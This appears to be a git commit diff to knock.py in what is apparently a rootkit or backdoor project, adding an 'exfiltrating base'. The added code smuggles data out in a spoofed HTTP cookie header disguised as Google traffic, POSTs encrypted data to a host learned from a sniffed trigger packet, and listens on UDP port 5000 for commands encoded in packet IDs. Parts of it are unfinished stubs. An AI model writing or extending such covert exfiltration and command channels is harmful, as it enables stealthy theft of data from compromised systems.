a60dc457ed45912767e47c134857dc1e31f30b8b
Bryan <b.r.hill@outlook.com>
2022-11-22 14:01:47 -0800

    Exfiltrating base added. output function will likely be removed

--- knock.py
+++ knock.py
@@ -1,5 +1,10 @@
+import socket
+
 import requests
 from scapy.all import *
+import webbrowser
+
+from scapy.layers.inet import IP
 
 from encryption import encryption
 
@@ -11,9 +16,31 @@ class remote_receiver:
         self.key = key
         conf.use_pcap = True
         self.encrypter = encryption(key)
+        self.host = ''
 
-    def exfiltrate(self):
+    def exfiltrate_output(self, data):
+        headers = {
+            'Host': 'www.google.com',
+            'Accept': 'text/html,application/xhtml+xml',
+            'Accept-Language': 'zh-cn',
+            'Accept-Charset': 'GB2312, utf-8;q=0.7,*;q=0.7',
+            'User-Agent': webbrowser.get().name,
+            'Keep-Alive': '115',
+            'Referer': 'http://www.google.com',
+            'cookie': data
+
+        }
+        session = requests.Session()
+        session.get(("http://" + self.host), headers=headers)
+        data_bytes = bytes(data, 'UTF-8')
+        data_len = len(data_bytes)
+
         print("exfiltrate here")
+
+    def exfiltrate(self, data, opt):
+        print("SEND POST REQUEST WITH ENCRYPTED DATA IN PAYLOAD. NO SIZE LIMIT")
+        print("Send 404 or 505 as response")
+        requests.post("http://" + self.host, cookies=opt, data=data)
 
     def listen_loop(self):
         sniff(filter="udp and port 5000", prn=self.packet_handler)
@@ -29,6 +56,6 @@ class remote_receiver:
             return
         payload_id = main_payload.id
         command = payload_id % 10
+        self.host = main_payload[IP].src
+        self.rkit.action_parse()
         print("handle packet")
-
-
